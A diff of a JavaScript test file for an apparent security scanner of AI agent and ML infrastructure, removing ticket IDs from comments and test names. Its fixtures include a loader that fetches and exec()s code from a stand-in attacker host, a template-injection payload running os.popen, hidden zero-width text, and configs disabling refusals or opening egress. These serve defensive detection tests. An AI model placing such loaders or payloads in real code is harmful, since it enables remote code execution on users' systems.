@@ -2052,7 +2052,7 @@ describe('AgentTelemetryAgent', async () => {
     } finally { cleanup(dir); }
   });
 
-  // ── Exfiltration + forensics additions (P-IMP-029 / P-IMP-033) ──────────
+  // ── Exfiltration + forensics additions ──────────
 
   it('detects zero-width text in transcript (EchoLeak class)', async () => {
     const { dir, file } = writeTempFile('{"content": "Here is the hidden\u200Bpayload\u200B for you"}', '.jsonl');
@@ -2252,7 +2252,7 @@ describe('EndpointAgentAbuseAgent', async () => {
 });
 
 // =============================================================================
-// MCP TRUST REGISTRY + SCANNER HARDENING (P-IMP-037 / P-IMP-038)
+// MCP TRUST REGISTRY + SCANNER HARDENING
 // =============================================================================
 
 describe('MCP trust registry', async () => {
@@ -2576,7 +2576,7 @@ describe('ASI-10 integrity-hash rule scoping', async () => {
 });
 
 // =============================================================================
-// GOVERNANCE ABSENCE-AUDITS (P-IMP-036)
+// GOVERNANCE ABSENCE-AUDITS
 // =============================================================================
 
 describe('governance audits', async () => {
@@ -2649,7 +2649,7 @@ describe('governance audits', async () => {
 });
 
 // =============================================================================
-// AI INFRA INVENTORY AGENT (P-IMP-035)
+// AI INFRA INVENTORY AGENT
 // =============================================================================
 
 describe('AiInfraInventoryAgent', async () => {
@@ -2723,9 +2723,9 @@ describe('AiInfraInventoryAgent', async () => {
     } finally { cleanup(dir); }
   });
 
-  // ── Lane 4: AI data pipelines & eval harnesses (P-IMP-046..048) ─────────
+  // ── Lane 4: AI data pipelines & eval harnesses ─────────
 
-  it('detects remote-code dataset loader (P-IMP-046)', async () => {
+  it('detects remote-code dataset loader', async () => {
     const dir = makeProject({ 'dataset/loader.py': 'import requests\ndata = requests.get("https://attacker.example/p.py")\nexec(data.text)\n' });
     try {
       const findings = await agent.analyze({ rootPath: dir, files: [path.join(dir, 'dataset/loader.py')], recon: {}, options: {} });
@@ -2733,7 +2733,7 @@ describe('AiInfraInventoryAgent', async () => {
     } finally { cleanup(dir); }
   });
 
-  it('detects trust_remote_code flag (P-IMP-046)', async () => {
+  it('detects trust_remote_code flag', async () => {
     const dir = makeProject({ 'train.py': 'ds = load_dataset("someone/repo", trust_remote_code=True)\n' });
     try {
       const findings = await agent.analyze({ rootPath: dir, files: [path.join(dir, 'train.py')], recon: {}, options: {} });
@@ -2741,7 +2741,7 @@ describe('AiInfraInventoryAgent', async () => {
     } finally { cleanup(dir); }
   });
 
-  it('detects template injection in dataset config (P-IMP-047)', async () => {
+  it('detects template injection in dataset config', async () => {
     const dir = makeProject({ 'dataset/dataset_infos.json': '{ "config_name": "{{ __import__(\'os\').popen(\'id\').read() }}", "splits": [] }' });
     try {
       const findings = await agent.analyze({ rootPath: dir, files: [path.join(dir, 'dataset/dataset_infos.json')], recon: {}, options: {} });
@@ -2749,7 +2749,7 @@ describe('AiInfraInventoryAgent', async () => {
     } finally { cleanup(dir); }
   });
 
-  it('detects eval-harness disabled guardrails (P-IMP-048)', async () => {
+  it('detects eval-harness disabled guardrails', async () => {
     const dir = makeProject({ 'eval/config.yaml': 'evaluation:\n  name: ExploitGym\n  cyber_refusals: disabled\n' });
     try {
       const findings = await agent.analyze({ rootPath: dir, files: [path.join(dir, 'eval/config.yaml')], recon: {}, options: {} });
@@ -2757,7 +2757,7 @@ describe('AiInfraInventoryAgent', async () => {
     } finally { cleanup(dir); }
   });
 
-  it('detects eval-harness broad egress (P-IMP-048)', async () => {
+  it('detects eval-harness broad egress', async () => {
     const dir = makeProject({ 'sandbox.yaml': 'container:\n  internet_egress: unrestricted\n  tool_scope: [shell, code_exec]\n' });
     try {
       const findings = await agent.analyze({ rootPath: dir, files: [path.join(dir, 'sandbox.yaml')], recon: {}, options: {} });
